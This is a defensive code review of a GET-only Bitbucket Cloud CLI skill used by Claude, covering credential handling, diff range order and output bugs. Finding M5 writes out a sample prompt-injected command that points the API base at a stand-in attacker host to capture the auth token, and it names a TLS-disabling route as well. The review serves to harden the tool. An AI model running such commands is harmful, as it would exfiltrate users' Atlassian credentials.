# Codebase review: `bitbucket-cloud` skill

Reviewed: 2026-10-13, at commit `92850ef` (branch `feature/improvements`, clean working tree), version 1.1.0.

| File                                                           | Lines | Role                                                                                        |
| -------------------------------------------------------------- | ----- | ------------------------------------------------------------------------------------------- |
| [SKILL.md](../../SKILL.md)                                     | 110   | Skill manifest and the instructions Claude follows                                          |
| [scripts/bb.mjs](../../scripts/bb.mjs)                         | 2,134 | The implementation: a dependency-free, GET-only Bitbucket Cloud CLI (Node 20+), 40 commands |
| [tests/bb.test.mjs](../../tests/bb.test.mjs)                   | 551   | `node:test` suite: unit tests, plus end-to-end tests against loopback mock servers          |
| [references/bbql.md](../../references/bbql.md)                 | 42    | BBQL cheat sheet for `--q` / `--sort`                                                       |
| [references/mcp-tool-map.md](../../references/mcp-tool-map.md) | 52    | Old `bb_*` MCP tool names mapped to commands                                                |
| [README.md](../../README.md)                                   | 165   | Human-facing setup and usage guide                                                          |
| [CHANGELOG.md](../../CHANGELOG.md)                             | 41    | Version history                                                                             |
| [package.json](../../package.json)                             | 12    | Version, Node engine, `npm test`                                                            |
| [.gitignore](../../.gitignore)                                 | 37    | Secrets, Node artefacts, logs, editor files                                                 |

This replaces the 1.1.0 review of the same name, which is in git history at `55b4022`. New findings continue its numbering (M5, L13, …), so the IDs that [CHANGELOG.md](../../CHANGELOG.md) cites (M1–M4, L1–L12) still mean the same findings. Their current status is in [Earlier findings](#earlier-findings).

## Status

| Finding                                       | Severity | Status                                                 |
| --------------------------------------------- | -------- | ------------------------------------------------------ |
| M1 `get` can read secret-bearing endpoints    | Medium   | **Partly fixed** (docs done, code guard missing)       |
| M5 Credentials go to any HTTPS API base       | Medium   | **Open** _(verified)_                                  |
| M6 `diff` range order is reversed from git    | Medium   | **Open** _(verified against the API spec)_             |
| L13–L20                                       | Low      | **Open**                                               |
| Nits                                          | —        | **Open**                                               |
| Test gaps                                     | —        | **Open**                                               |
| M2–M4, L1–L12 from the 1.1.0 review           | —        | Fixed and covered by tests (live checks not recorded)  |

`node --check scripts/bb.mjs` passes, and `node --test` passes all 46 tests on Node v24.12.0.

## How this review was done

- Read every tracked file in full, plus the git history and the previous review at `55b4022`.
- Ran the test suite.
- Probed suspected issues locally:
  - Imported `project`, `parseArgs` and `parseRepoToken` and called them directly.
  - Ran `bb check` against an unresolvable `.invalid` host with dummy credentials.
  - Printed what Git Bash does to arguments that start with `/`.
- Checked Bitbucket's behaviour against Atlassian's published OpenAPI spec (`swagger.v3.json`): the `diff`/`diffstat` spec order, the `topic` default, the repeatable `state` and `path` parameters, and code-search paging.
- **Nothing was run against live Bitbucket.** Findings that depend on live behaviour are marked _(unverified)_.
- The only HTTP method in the code is still `GET` ([bb.mjs:425](../../scripts/bb.mjs#L425)).

## Summary

The skill is in good shape. The read-only guarantee holds by construction: there is no code path for any other HTTP method. Every redirect hop is checked, input is validated strictly, and output is shaped for an LLM reader. The 1.1.0 findings are fixed and each one has a test. **No critical or high-severity issues were found.**

What remains:

1. **Credential exfiltration through configuration (M5).** `BITBUCKET_API_BASE` accepts any HTTPS host, and the credentials go with it. A prompt-injected command such as `BITBUCKET_API_BASE=https://attacker.example node bb.mjs check` would send the Basic-auth header to that host. SKILL.md's "untrusted content" paragraph is the only defence today.
2. **A silent wrong answer in a core workflow (M6).** Bitbucket reads `a..b` the opposite way to `git diff`, and nothing tells Claude this. `diff main..feature` shows what `main` has that `feature` lacks. Also, `--topic` does nothing, and `--topic=false` is silently dropped.
3. **M1's code guard.** The docs part is done, but `get` still reads any endpoint, including webhooks, deploy keys and pipeline variables.
4. **Smaller "silently wrong" leftovers (L13–L20).** These are the class of bug 1.1.0 set out to remove. The most notable is `--select`, which drops array and misspelled fields without a word.

## Architecture (unchanged since 1.1.0)

```
SKILL.md ──(tells Claude to run)──▶ node scripts/bb.mjs <command> [args] [flags]
                                        │
   parseArgs ─▶ checkFlags ─▶ checkArgs ─▶ command registry C{} ─▶ run(ctx) ─▶ { data, text, keepTail?, exitCode? }
                                        │                                      │
                  repoCtx / prCtx       │                   --select / --json / text, then --max-chars
                                        ▼
                  resolveRef, getList, getJson / getText ─▶ rawGet ─▶ fetchChecked (GET only, manual redirects)
```

The previous review describes each layer in detail; that description still holds. Since then, commit `92850ef` changed `search-code` (verbatim snippets, `--files`), `pr-activity` (`updateChanges`), `pr-commits` (merge-commit label) and `pr-context` (source sha, explicit empty description). Each of those changes has a test.

### Strengths

- **Read-only and credential-safe within its threat model.** It sends GET only, and credentials go only to the API origin. Off-origin redirects are refused, except for step-log storage, which gets no credentials. Secrets are never printed.
- **Honest output.** Every list has a "more results" footer. `pr-context` says "Unavailable: …" when a section fails, rather than showing an empty section. `prs` says when it is listing open PRs only, and `search-code` says its snippets may be incomplete.
- **Strict CLI.** Unknown flags, flags a command would ignore, extra arguments, single-dash options, and numbers that are not whole are all errors, and most come with a suggestion.
- **Context economy.** The CLI offers `--select`, server-side `--q`, diffstat before diff, line-numbered paged files, and tail-first logs fetched by range with colour codes removed.
- **Tested.** The tests drive the real CLI against loopback mock servers, using only Node built-ins.
- **Comments explain the non-obvious decisions**, such as the 406 on the log endpoint's `Accept` header, `process.exitCode` on Windows, and why `defaultBranch` does not guess.

## Findings

Severity: **Medium** means worth fixing soon. **Low** means polish or hardening.

### Medium

#### M5. `BITBUCKET_API_BASE` sends credentials to any HTTPS host _(verified, open)_

`apiBase()` ([bb.mjs:225-240](../../scripts/bb.mjs#L225-L240)) checks only that the base is a valid `https://` URL, or `http://` on loopback. Any HTTPS host passes, and `fetchChecked` attaches the `Authorization` header to every request to that origin ([bb.mjs:431](../../scripts/bb.mjs#L431)).

With `BITBUCKET_API_BASE=https://bb-review-probe.invalid/2.0` and dummy credentials, `bb check` went ahead and tried to call `GET /user` on that host. It failed only because the host does not resolve.

This matters because the skill exists to read untrusted text: PR descriptions, comments and build logs. One inline environment prefix is enough to send the user's Atlassian token to an attacker. The prefix is easy to miss in a long command line. `NODE_TLS_REJECT_UNAUTHORIZED=0` plus a proxy variable is a second route to the same result. SKILL.md tells Claude not to follow embedded instructions ([SKILL.md:32-34](../../SKILL.md#L32-L34)), but the code itself does not enforce this.

**Suggestion:**

1. Accept only `api.bitbucket.org` and loopback hosts (the tests need loopback). Bitbucket Cloud has no other API host, so nothing legitimate is lost. If a corporate gateway ever needs a custom host, add it to an allowlist in the script, where a change is reviewed. An environment opt-in would not help, because an injected command can set that too.
2. Refuse to send credentials when `NODE_TLS_REJECT_UNAUTHORIZED=0`.
3. Add a test for each.

#### M6. Range specs are the reverse of `git diff`, and `--topic` cannot be turned off _(verified against the API spec, open)_

Atlassian's spec for `diff/{spec}` and `diffstat/{spec}` says the first commit is "the commit containing the changes we wish to preview". The second is "the state to which we want to compare the first commit". The spec adds: "**This is the opposite of the order used in `git diff`.**"

Nothing in the skill says this:

- `help`: `'Unified diff for a commit ("<hash>") or range ("<a>..<b>")'` ([bb.mjs:1261](../../scripts/bb.mjs#L1261))
- SKILL.md: "Compare two refs | `diffstat` / `diff <ws>/<repo> <a>..<b>`" ([SKILL.md:67](../../SKILL.md#L67))
- README and mcp-tool-map

Claude naturally writes `main..feature` to mean "what does `feature` add". With Bitbucket's order, that request returns what `main` has that `feature` lacks. The output looks plausible and is wrong.

There is a related flag bug. The spec says `topic` "defaults to true" (a three-dot diff against the merge base). As a result:

- `--topic` sends `topic=true`, which is already the default, so the flag does nothing.
- `--topic=false` parses to `false` (confirmed with `parseArgs`). `ctx.flags.topic || undefined` ([bb.mjs:1268](../../scripts/bb.mjs#L1268), [bb.mjs:1288](../../scripts/bb.mjs#L1288)) then turns that into "omit the parameter".

So the plain two-dot diff, the one useful thing the flag could do, cannot be requested.

**Suggestion:**

1. Document the order everywhere `<a>..<b>` appears: "`<changes>..<base>`, the reverse of `git diff`; for 'what does feature add to main', use `feature..main`". Name the parts that way in the usage string, for example `<source>..<dest>`.
2. Replace `--topic` with `--two-dot`, which sends `topic=false`. Alternatively, forward an explicit `false` instead of dropping it.
3. Add a test that asserts the query string.

#### M1. `get` can still read secret-bearing configuration _(carried over, partly fixed)_

**Done in 1.1.0:**

- The `get` examples now use `default-reviewers` instead of `hooks`.
- SKILL.md says not to use `get` for webhooks, deploy keys, SSH keys, pipeline variables, access tokens or account emails ([SKILL.md:36](../../SKILL.md#L36)).

**Still open:** `get` ([bb.mjs:786-806](../../scripts/bb.mjs#L786-L806)) still fetches any path on the API origin, so the token's scopes remain the only barrier. That barrier is weaker than it looks: `read:repository` covers several of these endpoints.

**Suggestion:** add the denylist from the previous review: `hooks`, `deploy-keys`, `ssh-keys`, `pipelines_config/variables` (and the other `variables` paths), `access-tokens`, `/user/emails`. Match against `new URL(url).pathname` after normalisation, so that `%2e%2e` tricks and full-URL arguments are covered too. Fail with a message that names the policy, and add a test.

### Low

#### L13. `--select` silently drops array fields and misspelled fields _(verified)_

`project()` ([bb.mjs:1990-2007](../../scripts/bb.mjs#L1990-L2007)) walks dotted paths with plain property access. Two things go wrong:

- A path through an array, such as `reviewers.display_name` or `participants.approved`, reads a property of the array itself and gets `undefined`.
- A typo such as `titel` also gives `undefined`.

`JSON.stringify` then leaves `undefined` keys out entirely. `project({values:[{id:1, reviewers:[{display_name:"A"}], title:"t"}]}, "id,reviewers.display_name,titel")` returns `{"values":[{"id":1}]}`. A reader concludes there are no reviewers. This is the same "plausible wrong result" that 1.1.0 removed from flag parsing.

**Suggestion:**

- Map through arrays, so `reviewers.display_name` returns `["A"]`.
- Emit `null` rather than `undefined`, so the key stays visible.
- Write a stderr warning when a path matched nothing in any item.

#### L14. Git Bash path rewriting is caught only in `get` _(verified)_

In Git Bash, `/src/a.ts` reaches Node as `C:/Program Files/Git/src/a.ts`. The same happens to `--path=/src/b.ts` (confirmed). `get` detects this case ([bb.mjs:792](../../scripts/bb.mjs#L792)). The following commands only strip leading slashes, which is too late, and then 404 with a "check spelling" hint:

- `file` ([bb.mjs:1031](../../scripts/bb.mjs#L1031))
- `browse` ([bb.mjs:940](../../scripts/bb.mjs#L940))
- `file-history` ([bb.mjs:1060](../../scripts/bb.mjs#L1060))
- `--path` on `diff`, `diffstat`, `pr-diff` and `pr-diffstat`

**Suggestion:** move the `^[A-Za-z]:[\\/]` check into a shared helper for every repository path argument and for `--path`.

#### L15. The diffstat headline reports one page as if it were the total

`diffstatText` ([bb.mjs:692-704](../../scripts/bb.mjs#L692-L704)) prints `Diffstat for …: 100 file(s), +a -b` from the page it has. On a PR with 150 files, the only sign that the totals are partial is the footer, about 100 lines further down. `pr-context` already warns in this case.

**Suggestion:** when `r.next` is set, word the headline as "first 100 files (more exist), +a -b so far".

#### L16. `parseRepoToken` does not handle git remotes _(verified)_

Claude often gets the repository from `git remote get-url origin`. The parser ([bb.mjs:571-607](../../scripts/bb.mjs#L571-L607)) handles these forms badly:

- `git@bitbucket.org:ws/repo.git` parses as workspace `git@bitbucket.org:ws`, repo `repo.git`.
- `https://bitbucket.org/ws/repo.git` keeps the `.git` suffix.

Both give a 404 with a hint about credentials or spelling. Separately, a PR URL with a malformed id such as `…/pull-requests/12abc` becomes `NaN`, and the error then says "Missing pull request id".

**Suggestion:**

- Accept the `git@bitbucket.org:` SSH form.
- Strip a trailing `.git`.
- Validate the URL's PR id with `int()`.

#### L17. `pr-context` ignores `--branch` when an id is also given

With a PR URL or an id, `--branch` is skipped without a word ([bb.mjs:1582](../../scripts/bb.mjs#L1582)). Every other ignored flag is rejected.

**Suggestion:** fail with "pass either a PR id/URL or --branch, not both".

#### L18. `browse` cannot get past 100 entries

`browse` is not a list command, so it has no `--page`. `--limit` is capped at 100 ([bb.mjs:942](../../scripts/bb.mjs#L942)), and the footer's only advice is to browse a subdirectory. A flat directory with more than 100 entries cannot be listed in full. `--limit` also has two meanings: entries for a directory, but lines when the path turns out to be a file.

**Suggestion:** make `browse` a paged command, with `--all` and footer support. The API also supports `max_depth` for recursive listings.

#### L19. `prs` accepts only one `--state`

The API lets `state` be repeated. The CLI sends one value ([bb.mjs:1306-1307](../../scripts/bb.mjs#L1306-L1307)), so "does a PR for X exist at all?" takes four calls. SKILL.md asks Claude to make exactly that check before saying a PR does not exist.

Separately, the `openOnly` heading logic assumes that a `--q` mentioning `state` overrides Bitbucket's default OPEN filter _(unverified)_. If it does not, `prs --q 'state="MERGED"'` returns nothing under the heading "Pull requests", without the open-only hint.

**Suggestion:**

- Accept `--state MERGED,DECLINED` (or `--state ALL`) and repeat the parameter.
- Check the `--q` interaction once against live Bitbucket.

#### L20. Output flags are validated only after the request

`--max-chars` is parsed with `int()` after `command.run()` has finished ([bb.mjs:2078](../../scripts/bb.mjs#L2078)). `--max-chars abc` therefore makes all the API calls and then fails. `--select ""` is silently treated as no selection.

**Suggestion:** validate both in `main` before `run()`.

### Nits

- `check` prints `API base: ${BASE}` verbatim ([bb.mjs:744](../../scripts/bb.mjs#L744)). A base that contains `user:pass@` would print that userinfo, and `fetch` rejects such URLs in any case. `apiBase()` should reject URLs with userinfo.
- The version string is kept in three places: `VERSION` in [bb.mjs:21](../../scripts/bb.mjs#L21), [package.json](../../package.json) and [README.md:7](../../README.md#L7). A one-line test that compares them would stop drift.
- `diff` and `diffstat` send a single `--path`, although the API accepts the parameter repeated. A comma-separated list would cover multi-file review in one call.
- `commit` calls `c.message.trim()` with no guard ([bb.mjs:1204](../../scripts/bb.mjs#L1204)). Every other formatter tolerates missing fields.
- In `search-code`, two `content_matches` that cover the same line print it twice, with a `...` between the copies ([bb.mjs:1945-1952](../../scripts/bb.mjs#L1945-L1952)).
- The `search-code` row in [mcp-tool-map.md:42](../../references/mcp-tool-map.md#L42) does not list `--files`.

## Testing

The suite is good. It drives the real CLI, uses no dependencies and runs in about 4 s. Each 1.1.0 finding and each `92850ef` change has a test. Nothing tests these:

| Area                                                                   | Why it matters                                                                    |
| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| Retries: 429 with `Retry-After`, 5xx backoff, the 30 s give-up         | Most intricate code in the file ([bb.mjs:456-524](../../scripts/bb.mjs#L456-L524)) |
| Request timeout and transient network errors (`NetworkError` hints)    | Same                                                                              |
| `--all` across several pages, and the `--max-pages` truncation footer  | Correctness of every "complete" answer                                            |
| `comment-thread`: nested replies and the truncation warning            | Recursive walk with no coverage                                                   |
| `--select` and `--max-chars` (head cut, and `keepTail` for logs)       | L13 would have been caught                                                        |
| Non-loopback `http://` API base is refused                             | Security check; M5's fix needs the same kind of test                              |
| `Authorization` **is** sent to the API origin                          | Only its absence on foreign hops is asserted                                      |
| HTML instead of JSON (`parseJson` proxy message)                       | Common behind corporate proxies                                                   |
| Bare `<repo>` with `BITBUCKET_WORKSPACE`                               | Documented feature                                                                |

The retry tests would wait 1–3 s each, because backoff uses real `sleep`. A hidden `BITBUCKET_RETRY_BASE_MS` (or an exported constant the tests can override) would keep the suite fast.

## Earlier findings

Status of the 1.1.0 review's findings, as cited in [CHANGELOG.md](../../CHANGELOG.md):

| ID       | Topic                                                    | Status now                                                                                   |
| -------- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| M1       | `get` and secrets                                        | Partly fixed: examples and SKILL.md guidance done; denylist not implemented (see above)      |
| M2       | Fetched content is untrusted                             | Fixed: [SKILL.md:32-36](../../SKILL.md#L32-L36)                                               |
| M3       | Extra arguments ignored                                  | Fixed and tested                                                                             |
| M4       | Missing "more results" footer                            | Fixed and tested                                                                             |
| L1–L12   | `browse` root, line counts, activity, flags, numbers, …  | Fixed and tested                                                                             |
| Live checks (L1, L7, L9, L12) | Bitbucket behaviour tested only on the mock | No record that they were done. `92850ef` came from using the skill on a real PR, but its message does not mention these checks |
| Housekeeping | Commit README, CHANGELOG, package.json, tests        | Done                                                                                         |

## Policy alignment (managed settings)

| Policy item                                                | Status                                                                                                                                                       |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Production systems read-only; never approve, merge, deploy | **Met.** GET-only client with no write commands. SKILL.md tells Claude to decline write requests and offer draft text instead.                                  |
| No credentials or secrets in prompts                       | **Met for normal use.** **Gaps:** an untrusted instruction can send the token to another host through the environment (M5), and `get` can read secret-bearing endpoints (M1). |
| No customer data in prompts                                | **Partly mitigated by guidance.** SKILL.md says to summarise rather than dump. The CLI does no redaction; pipeline logs are the likeliest source.               |
| Incident reporting for accidental disclosure               | **Addressed** in SKILL.md and the README's security notes.                                                                                                    |
| Claude may propose changes for human review                | **Supported.** Write requests become drafts for the user to post.                                                                                             |

## Next steps

1. **M5:** limit the API host to `api.bitbucket.org` and loopback, and refuse to send credentials when `NODE_TLS_REJECT_UNAUTHORIZED=0`. This is a small code change plus two tests, and it closes the most serious remaining gap.
2. **M6:** document the reversed `<a>..<b>` order in `help`, SKILL.md, the README and mcp-tool-map, and replace `--topic` with a working two-dot option. Add a query-string test.
3. **M1:** add the `get` denylist and a test.
4. **L13 and L14:** these two Low items are most likely to mislead Claude in practice.
5. **Tests** for retries, paging, `comment-thread`, `--select` and `--max-chars`, with a configurable backoff so the suite stays fast.
6. **Live checks** with a read-only token:
   - the earlier L1, L7, L9 and L12
   - the `prs --q 'state=…'` interaction (L19)
   - one `diff feature..main` call to confirm M6's order on real data
7. Bump to 1.2.0 and add a CHANGELOG entry that cites these IDs.
